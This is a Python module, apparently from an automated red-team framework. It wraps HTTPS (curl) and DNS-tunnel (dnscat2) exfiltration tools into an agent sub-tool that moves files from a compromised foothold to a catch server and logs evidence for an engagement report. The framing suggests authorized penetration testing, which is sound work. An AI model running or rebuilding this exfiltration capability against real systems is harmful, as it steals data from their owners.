"""ExfilAgent sub-agent.

Wraps the two exfiltration tools added in Phase 4 Task 7:

* :func:`exfil_https` — POST a file to a catch server via ``curl``.
  Preferred when egress HTTPS is allowed (faster, larger files).
* :func:`exfil_dns`   — tunnel a file out via ``dnscat2``. Used when
  HTTPS egress is blocked but DNS is allowed (slower, smaller chunks).

The sub-agent dispatches based on the ``method`` parameter (``"https"``
or ``"dns"``). The Post-Ex Agent (Phase 4 Task 11) decides which
method to use based on the foothold's egress profile.

The wrapped tool's :class:`ExfilResult` is converted into an
:class:`ExfilEvidence` record (with a stable id and timestamp) so the
Phase 5 report can point operators at the catch-server log path that
confirms the transfer landed.
"""
from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.models.postex import ExfilEvidence
from autored.tools.exfil import exfil_dns, exfil_https

log = get_logger("subagents.exfilagent")


class ExfilAgentOutput(BaseModel):
    host_ip: str
    method: str
    evidence: ExfilEvidence | None = None


@tool
async def exfilagent_subagent(
    host_ip: str,
    file_path: str,
    catch_server: str,
    method: str = "https",
    domain: str = "",
    engagement_id: str = "",
) -> ExfilAgentOutput:
    """Exfiltrate a file from a foothold to the catch server.

    Args:
        host_ip: Source host IP (the foothold).
        file_path: Path to the file on the foothold to exfiltrate.
        catch_server: Catch server hostname or IP (for HTTPS method)
            or DNS tunnel domain (for DNS method).
        method: ``"https"`` (default) or ``"dns"``.
        domain: DNS tunnel domain (DNS method only). When empty,
            ``catch_server`` is reused as the DNS domain.
        engagement_id: Current engagement ID.

    Returns:
        ExfilAgentOutput with an ExfilEvidence record pointing at the
        catch-server log path operators check to confirm the transfer.
    """
    log.info(
        "exfilagent_start",
        host_ip=host_ip, method=method, file_path=file_path,
    )

    if method == "dns":
        dns_domain = domain or catch_server
        result = await exfil_dns.ainvoke({
            "domain": dns_domain,
            "file_path": file_path,
            "host_ip": host_ip,
            "engagement_id": engagement_id,
        })
    else:
        # Default to HTTPS — the faster, larger-file method.
        result = await exfil_https.ainvoke({
            "catch_server": catch_server,
            "file_path": file_path,
            "host_ip": host_ip,
            "engagement_id": engagement_id,
        })

    evidence = ExfilEvidence(
        method=result.method,
        source_host=result.source_host,
        data_size_bytes=result.data_size_bytes,
        catch_server=result.catch_server,
        catch_server_log_path=result.catch_server_log_path,
    )

    log.info(
        "exfilagent_done",
        host_ip=host_ip, method=method,
        catch_server=result.catch_server,
        log_path=result.catch_server_log_path,
    )
    return ExfilAgentOutput(
        host_ip=host_ip,
        method=result.method,
        evidence=evidence,
    )
